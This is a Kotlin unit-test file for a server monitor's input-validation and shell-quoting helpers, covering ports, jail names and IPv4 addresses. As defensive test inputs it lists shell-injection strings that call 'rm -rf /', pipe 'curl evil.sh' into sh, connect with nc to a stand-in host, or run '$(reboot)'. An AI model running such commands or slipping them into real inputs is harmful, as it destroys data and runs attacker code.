package org.didban.monitor

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class SecurityValidationTest {

    // ── validatePort ────────────────────────────────────────────────────────

    @Test
    fun `valid ports are accepted`() {
        assertEquals(443, SecurityValidation.validatePort("443"))
        assertEquals(8080, SecurityValidation.validatePort("8080"))
        assertEquals(1, SecurityValidation.validatePort("1"))
        assertEquals(65535, SecurityValidation.validatePort("65535"))
        assertEquals(443, SecurityValidation.validatePort(" 443 ")) // trimmed
    }

    @Test
    fun `zero and out-of-range ports are rejected`() {
        assertNull(SecurityValidation.validatePort("0"))
        assertNull(SecurityValidation.validatePort("65536"))
        assertNull(SecurityValidation.validatePort("99999"))
        assertNull(SecurityValidation.validatePort("100000000"))
    }

    @Test
    fun `empty and malformed ports are rejected`() {
        assertNull(SecurityValidation.validatePort(""))
        assertNull(SecurityValidation.validatePort("   "))
        assertNull(SecurityValidation.validatePort("abc"))
        assertNull(SecurityValidation.validatePort("44a3"))
        assertNull(SecurityValidation.validatePort("-1"))
        assertNull(SecurityValidation.validatePort("+443"))
        assertNull(SecurityValidation.validatePort("44.3"))
        assertNull(SecurityValidation.validatePort("443/tcp"))
    }

    @Test
    fun `shell injection attempts are rejected`() {
        assertNull(SecurityValidation.validatePort("443;rm -rf /"))
        assertNull(SecurityValidation.validatePort("443 && curl evil.sh|sh"))
        assertNull(SecurityValidation.validatePort("443 | nc evil 4444"))
        assertNull(SecurityValidation.validatePort("\$(reboot)"))
        assertNull(SecurityValidation.validatePort("443\ncurl evil.sh"))
        assertNull(SecurityValidation.validatePort("1;2"))
    }

    // ── validateJail ────────────────────────────────────────────────────────

    @Test
    fun `valid jail names are accepted`() {
        assertTrue(SecurityValidation.validateJail("sshd"))
        assertTrue(SecurityValidation.validateJail("sshd-ddos"))
        assertTrue(SecurityValidation.validateJail("nginx-limit-req"))
    }

    @Test
    fun `unsafe jail names are rejected`() {
        assertFalse(SecurityValidation.validateJail(""))
        assertFalse(SecurityValidation.validateJail("sshd;reboot"))
        assertFalse(SecurityValidation.validateJail("sshd && x"))
        assertFalse(SecurityValidation.validateJail("sshd/rm"))
        assertFalse(SecurityValidation.validateJail("ss hd"))
        assertFalse(SecurityValidation.validateJail("a".repeat(65)))
    }

    // ── isValidIpv4 ─────────────────────────────────────────────────────────

    @Test
    fun `valid ipv4 addresses are accepted`() {
        assertTrue(SecurityValidation.isValidIpv4("194.26.29.112"))
        assertTrue(SecurityValidation.isValidIpv4("0.0.0.0"))
        assertTrue(SecurityValidation.isValidIpv4("255.255.255.255"))
        assertTrue(SecurityValidation.isValidIpv4("1.2.3.4"))
    }

    @Test
    fun `invalid ipv4 addresses are rejected`() {
        assertFalse(SecurityValidation.isValidIpv4(""))
        assertFalse(SecurityValidation.isValidIpv4("256.1.1.1"))
        assertFalse(SecurityValidation.isValidIpv4("1.2.3"))
        assertFalse(SecurityValidation.isValidIpv4("1.2.3.4.5"))
        assertFalse(SecurityValidation.isValidIpv4("1.2.3.04")) // leading zero
        assertFalse(SecurityValidation.isValidIpv4("1.2.3.-4"))
        assertFalse(SecurityValidation.isValidIpv4("1.2.3.4;rm -rf /"))
        assertFalse(SecurityValidation.isValidIpv4("1.2.3.4%eth0"))
    }

    // ── shellQuote ──────────────────────────────────────────────────────────

    @Test
    fun `plain values are single-quoted`() {
        assertEquals("'443/tcp'", SecurityValidation.shellQuote("443/tcp"))
        assertEquals("'sshd'", SecurityValidation.shellQuote("sshd"))
    }

    @Test
    fun `metacharacters pass through verbatim inside quotes`() {
        val backtickArg = "a" + "`" + "id" + "`"
        for (arg in listOf(
            "443/tcp", "sshd", "443;rm -rf /", "a\$HOME", backtickArg,
            "a\"b\"", "a\nb", "x&&y", "x|y", "x>y", "(x)"
        )) {
            assertEquals("'" + arg + "'", SecurityValidation.shellQuote(arg))
        }
    }

    @Test
    fun `embedded single quotes are escaped correctly`() {
        // a'b  ->  'a'\''b'
        assertEquals("'" + "a" + "'\\''" + "b" + "'", SecurityValidation.shellQuote("a'b"))
        // '    ->  '\'' (open, escaped quote, close)
        assertEquals("'" + "'\\''" + "'", SecurityValidation.shellQuote("'"))
        // ''   ->  ''\'''\'''
        assertEquals("'" + "'\\''" + "'\\''" + "'", SecurityValidation.shellQuote("''"))
    }

    @Test
    fun `quoting never injects a closing quote`() {
        for (arg in listOf("'", "''", "'; rm -rf /;", "\$'", "`" + "`", "x'y'z")) {
            val quoted = SecurityValidation.shellQuote(arg)
            assertTrue(quoted.startsWith("'"))
            assertTrue(quoted.endsWith("'"))
            // Strip the outer quotes: every interior ' must be part of the
            // escaping sequence '\''.
            val interior = quoted.substring(1, quoted.length - 1)
            var i = 0
            while (i < interior.length) {
                if (interior[i] == '\'') {
                    assertTrue("unescaped quote in $quoted", interior.startsWith("'\\''", i))
                    i += 4
                } else {
                    i++
                }
            }
        }
    }
}
